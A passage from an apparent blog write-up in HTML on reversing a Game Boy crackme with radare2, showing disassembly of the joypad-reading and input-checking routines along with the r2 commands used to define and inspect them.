</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">load_joypad_to_e</span> <span class="mi">5</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e94</span>    <span class="no">cd601e</span>       <span class="no">call</span> <span class="no">read_joypad</span> <span class="err">;[</span><span class="mi">1</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>             <span class="nf">read_joypad</span><span class="p">(</span><span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">,</span> <span class="mi">0x0</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>          <span class="err">0</span><span class="nf">x00001e97</span>    <span class="mi">5</span><span class="no">f</span>           <span class="no">ld</span> <span class="no">e</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'><span class="err">\</span>          <span class="err">0</span><span class="nf">x00001e98</span>    <span class="no">c9</span>           <span class="no">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>Essentially, in pseudocode</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">a</span> <span class="o">=</span> <span class="n">read_joypad</span><span class="p">();</span>
</span><span class='line'><span class="n">e</span> <span class="o">=</span> <span class="n">a</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>For some time I was stuck here, as it didn&rsquo;t seem that the <code>load_joypad_to_e</code>
was called anywhere, r2 did not find any calls, but we can use the same trick
we used to find the references to the memory mapped io of the joypad to find
references to the <code>load_joypad_to_e</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">[</span><span class="mh">0x00001e94</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">s</span> <span class="mi">0</span><span class="p">;</span> <span class="n">pd</span> <span class="mi">10000</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">load_joypad</span>
</span><span class='line'><span class="n">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">print</span> <span class="mf">566.8</span><span class="n">K</span> <span class="n">chars</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">)</span>
</span><span class='line'>  <span class="o">--------&gt;</span> <span class="mh">0x00000d6f</span>    <span class="n">cd941e</span>       <span class="n">call</span> <span class="n">load_joypad_to_e</span>
</span><span class='line'>          <span class="o">&gt;</span>    <span class="n">load_joypad_to_e</span><span class="p">()</span>
</span><span class='line'>  <span class="o">/</span> <span class="p">(</span><span class="n">fcn</span><span class="p">)</span> <span class="n">load_joypad_to_e</span> <span class="mi">5</span>
</span></code></pre></td></tr></table></div></figure>


<p>Looks like it is referenced just once, so seek to <code>0xd6f</code> and open visual mode.
Looks to be the beginning of a big block of code, define as a function and start
reversing. I defined it as <code>checker_loop</code> once I realized that this is the main
crackme part.</p>

<p>It looks like the auto analysis fails to detect the proper end of the function.
This is fine, because we can tell r2 exactly how long the function is ourselves.</p>

<p>Looking at the code, the last instruction of the function is the <code>ret</code> at
<code>0xf01</code>, so, by starting at <code>0xd6f</code> the function should be 403 bytes. Just
define the function like this</p>

<p><code>[0x00000e5f]&gt; af+ 0xd6f 403 checker_loop</code></p>

<p>Now we can disassemble the entire function with <code>pdf @ checker_loop</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">/</span> <span class="err">(</span><span class="nf">fcn</span><span class="p">)</span> <span class="no">checker_loop</span> <span class="mi">403</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000d6f</span>    <span class="no">cd941e</span>       <span class="no">call</span> <span class="no">load_joypad_to_e</span>
</span><span class='line'><span class="err">|</span>              <span class="nf">load_joypad_to_e</span><span class="p">()</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000d72</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000d75</span>    <span class="mi">73</span>           <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="no">e</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000d76</span>    <span class="mi">21</span><span class="no">a1c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a1</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000d79</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000d7a</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000d7d</span>    <span class="no">be</span>           <span class="no">cp</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>       <span class="err">,=&lt;</span> <span class="err">0</span><span class="nf">x00000d7e</span>    <span class="mi">2003</span>         <span class="no">jr</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span>      <span class="err">,==&lt;</span> <span class="err">0</span><span class="nf">x00000d80</span>    <span class="no">c3f60e</span>       <span class="no">jp</span> <span class="no">loc.00000ef6</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|`-&gt;</span> <span class="err">0</span><span class="nf">x00000d83</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000d86</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000d87</span>    <span class="no">fe0d</span>         <span class="no">cp</span> <span class="mi">0x0d</span>
</span><span class='line'><span class="err">|</span>     <span class="err">,===&lt;</span> <span class="err">0</span><span class="nf">x00000d89</span>    <span class="no">c2990d</span>       <span class="no">jp</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x0d99</span>
</span><span class='line'><span class="err">|</span>    <span class="err">,====&lt;</span> <span class="err">0</span><span class="nf">x00000d8c</span>    <span class="mi">1803</span>         <span class="no">jr</span> <span class="mi">0x03</span> <span class="err">;</span> <span class="p">(</span><span class="no">checker_loop</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>   <span class="err">,=====&lt;</span> <span class="err">0</span><span class="nf">x00000d8e</span>    <span class="no">c3990d</span>       <span class="no">jp</span> <span class="mi">0x0d99</span> <span class="err">;</span> <span class="p">(</span><span class="no">checker_loop</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span>   <span class="err">|`----&gt;</span> <span class="err">0</span><span class="nf">x00000d91</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>   <span class="err">|</span> <span class="err">||</span>    <span class="err">0</span><span class="nf">x00000d94</span>    <span class="mi">3600</span>         <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x00</span>
</span><span class='line'><span class="err">|</span>  <span class="err">,======&lt;</span> <span class="err">0</span><span class="nf">x00000d96</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|`-`---&gt;</span> <span class="err">0</span><span class="nf">x00000d99</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000d9c</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000d9d</span>    <span class="no">e604</span>         <span class="no">and</span> <span class="mi">0x04</span>
</span><span class='line'><span class="err">|</span> <span class="err">,=======&lt;</span> <span class="err">0</span><span class="nf">x00000d9f</span>    <span class="mi">2003</span>         <span class="no">jr</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000da1</span>    <span class="no">c3c90d</span>       <span class="no">jp</span> <span class="no">loc.00000dc9</span>
</span><span class='line'><span class="err">|</span> <span class="err">`-------&gt;</span> <span class="err">0</span><span class="nf">x00000da4</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000da7</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000da8</span>    <span class="no">b7</span>           <span class="no">or</span> <span class="no">a</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000da9</span>    <span class="no">caba0d</span>       <span class="no">jp</span> <span class="no">Z</span><span class="p">,</span> <span class="mi">0x0dba</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dac</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000daf</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000db0</span>    <span class="no">fe04</span>         <span class="no">cp</span> <span class="mi">0x04</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000db2</span>    <span class="no">c2c10d</span>       <span class="no">jp</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x0dc1</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000db5</span>    <span class="mi">1803</span>         <span class="no">jr</span> <span class="mi">0x03</span> <span class="err">;</span> <span class="p">(</span><span class="no">checker_loop</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000db7</span>    <span class="no">c3c10d</span>       <span class="no">jp</span> <span class="mi">0x0dc1</span> <span class="err">;</span> <span class="p">(</span><span class="no">checker_loop</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000dba</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dbd</span>    <span class="mi">34</span>           <span class="no">inc</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000dbe</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000dc1</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dc4</span>    <span class="mi">3600</span>         <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x00</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000dc6</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|-</span> <span class="nf">loc.00000dc9</span> <span class="mi">49</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000dc9</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dcc</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dcd</span>    <span class="no">e601</span>         <span class="no">and</span> <span class="mi">0x01</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000dcf</span>    <span class="mi">2003</span>         <span class="no">jr</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000dd1</span>    <span class="no">c3fa0d</span>       <span class="no">jp</span> <span class="no">loc.00000dfa</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000dd4</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dd7</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dd8</span>    <span class="no">fe01</span>         <span class="no">cp</span> <span class="mi">0x01</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000dda</span>    <span class="no">caeb0d</span>       <span class="no">jp</span> <span class="no">Z</span><span class="p">,</span> <span class="mi">0x0deb</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ddd</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000de0</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000de1</span>    <span class="no">fe05</span>         <span class="no">cp</span> <span class="mi">0x05</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000de3</span>    <span class="no">c2f20d</span>       <span class="no">jp</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x0df2</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000de6</span>    <span class="mi">1803</span>         <span class="no">jr</span> <span class="mi">0x03</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000dc9</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000de8</span>    <span class="no">c3f20d</span>       <span class="no">jp</span> <span class="mi">0x0df2</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000dc9</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000deb</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dee</span>    <span class="mi">34</span>           <span class="no">inc</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000def</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000df2</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000df5</span>    <span class="mi">3600</span>         <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x00</span>
</span><span class='line'><span class="err">\</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000df7</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|-</span> <span class="nf">loc.00000dfa</span> <span class="mi">49</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000dfa</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dfd</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000dfe</span>    <span class="no">e608</span>         <span class="no">and</span> <span class="mi">0x08</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e00</span>    <span class="mi">2003</span>         <span class="no">jr</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e02</span>    <span class="no">c32b0e</span>       <span class="no">jp</span> <span class="no">loc.00000e2b</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e05</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e08</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e09</span>    <span class="no">fe02</span>         <span class="no">cp</span> <span class="mi">0x02</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e0b</span>    <span class="no">ca1c0e</span>       <span class="no">jp</span> <span class="no">Z</span><span class="p">,</span> <span class="mi">0x0e1c</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e0e</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e11</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e12</span>    <span class="no">fe06</span>         <span class="no">cp</span> <span class="mi">0x06</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e14</span>    <span class="no">c2230e</span>       <span class="no">jp</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x0e23</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e17</span>    <span class="mi">1803</span>         <span class="no">jr</span> <span class="mi">0x03</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000dfa</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e19</span>    <span class="no">c3230e</span>       <span class="no">jp</span> <span class="mi">0x0e23</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000dfa</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e1c</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e1f</span>    <span class="mi">34</span>           <span class="no">inc</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e20</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e23</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e26</span>    <span class="mi">3600</span>         <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x00</span>
</span><span class='line'><span class="err">\</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e28</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|-</span> <span class="nf">loc.00000e2b</span> <span class="mi">49</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e2b</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
